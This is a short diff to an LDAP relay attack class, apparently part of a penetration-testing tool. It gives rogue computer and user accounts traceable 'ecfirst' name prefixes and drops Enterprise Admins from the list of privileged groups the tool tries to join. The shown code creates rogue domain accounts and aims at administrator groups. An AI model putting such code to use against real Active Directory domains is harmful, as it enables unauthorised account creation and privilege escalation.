@@ -149,7 +149,7 @@ class LDAPAttack(ProtocolAttack):
         computerName = self.computerName
         if not computerName:
             # Random computername
-            newComputer = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
+            newComputer = 'ecfirst-' + (''.join(random.choice(string.ascii_letters) for _ in range(4)) + '$').upper()
         else:
             newComputer = computerName if computerName.endswith('$') else computerName + '$'
 
@@ -213,7 +213,7 @@ class LDAPAttack(ProtocolAttack):
         newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
 
         # Random username
-        newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))
+        newUser = 'ecfirstrogue_' + ''.join(random.choice(string.ascii_letters) for _ in range(4))
         newUserDn = 'CN=%s,%s' % (newUser, parent)
         ucd = {
             'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % domainDumper.root,
@@ -516,8 +516,8 @@ class LDAPAttack(ProtocolAttack):
         self.checkSecurityDescriptors(entries, privs, membersids, sidmapping, domainDumper)
 
         # Interesting groups we'd like to be a member of, in order of preference
+        # Removed ::  '%s-%d' % (domainsid, 519), # Enterprise admins
         interestingGroups = [
-            '%s-%d' % (domainsid, 519), # Enterprise admins
             '%s-%d' % (domainsid, 512), # Domain admins
             'S-1-5-32-544', # Built-in Administrators
             'S-1-5-32-551', # Backup operators
